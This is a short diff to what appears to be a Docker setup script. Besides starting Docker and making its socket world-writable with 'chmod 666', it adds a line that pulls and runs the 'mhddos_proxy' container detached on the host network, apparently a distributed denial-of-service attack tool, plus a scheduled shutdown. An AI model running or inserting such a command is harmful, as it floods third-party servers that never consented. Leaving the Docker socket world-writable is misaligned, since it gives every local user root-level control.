@@ -31,6 +31,7 @@ sudo systemctl unmask docker.socket
 sudo systemctl start docker.service 
 sudo chmod 666 /var/run/docker.sock 
 sudo docker run hello-world
-
+sudo shutdown 02:00
+sudo docker run  -d -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 700 --lang UA --user-id 880460538
 
 
